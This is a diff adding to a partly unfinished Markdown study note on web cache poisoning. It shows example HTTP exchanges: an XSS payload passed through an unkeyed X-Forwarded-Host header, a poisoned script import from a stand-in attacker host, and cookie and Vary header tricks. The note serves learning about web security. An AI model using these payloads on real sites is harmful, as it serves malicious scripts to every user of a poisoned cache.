@@ -23,3 +23,88 @@ Depend on two key factors:
 
 ### Identify and evaluate unkeyed inputs
 TO DO
+
+### Elicit a harmful response from the back-end server
+TO DO
+
+### Get the response cached
+TO DO
+
+## Exploiting cache design flaws
+### Using web cache poisoning to deliver an XSS attack
+```
+Simplest web cache poisoning vulnerability to exploit is when unkeyed input is reflected in a cacheable response without proper sanitization
+GET /en?region=uk HTTP/1.1
+Host: innocent-website.com
+X-Forwarded-Host: innocent-website.co.uk
+
+HTTP/1.1 200 OK
+Cache-Control: public
+<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
+```
+- `X-Forwarded-Host` is being used to dynamically generate an Open Graph image URL
+- `X-Forwarded-Host` is unkeyed
+- -> `X-Forwarded-Host: a."><script>alert(1)</script>"`
+- If this response was cached, all users who accessed `/en?region=uk` would be served this XSS payload
+
+### Using web cache poisoning to exploit unsafe handling of resource imports
+```
+GET / HTTP/1.1
+Host: innocent-website.com
+X-Forwarded-Host: evil-user.net
+User-Agent: Mozilla/5.0 Firefox/57.0
+
+HTTP/1.1 200 OK
+<script src="https://evil-user.net/static/analytics.js"></script>
+```
+
+### Using web cache poisoning to exploit cookie-handling vulnerabilities
+```
+GET /blog/post.php?mobile=1 HTTP/1.1
+Host: innocent-website.com
+User-Agent: Mozilla/5.0 Firefox/57.0
+Cookie: language=pl;
+Connection: close
+```
+- Premise (as always): `Cookie` header is unkeyed
+- If the response to this request is cached, then all subsequent users who tried to access this blog post would receive the Polish
+- Note: it is a rare case
+  - When cookie-based cache poisoning vulnerabilities exist, they tend to be identified and resolved quickly because legitimate users have accidentally poisoned the cache
+
+### Using multiple headers to exploit web cache poisoning vulnerabilities
+```
+GET /random HTTP/1.1
+Host: innocent-site.com
+X-Forwarded-Proto: http
+
+HTTP/1.1 301 moved permanently
+Location: https://innocent-site.com/random
+```
+
+### Exploiting responses that expose too much information
+#### Cache-control directives
+- One of the challenges when constructing a web cache poisoning attack is ensuring that the harmful response gets cached
+  - This can involve a lot of manual trial and error to study how the cache behaves
+  - However, sometimes responses explicitly reveal some of the information an attacker needs to successfully poison the cache
+```
+HTTP/1.1 200 OK
+Via: 1.1 varnish-v4
+Age: 174
+Cache-Control: public, max-age=1800
+```
+#### Vary header
+- The `Vary` header specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed
+  - For example, it is commonly used to specify that the `User-Agent` header is keyed
+      - If the mobile version of a website is cached, this won't be served to non-mobile users by mistake.
+- An attacker can also:
+  - Attack only users with that user agent are affected
+  - Work out which user agent was most commonly used to access the site (attack to affect the maximum number of users)
+
+### Using web cache poisoning to exploit DOM-based vulnerabilities
+TO DO
+
+### Chaining web cache poisoning vulnerabilities
+TO DO
+
+## Exploiting cache implementation flaws
+TO DO
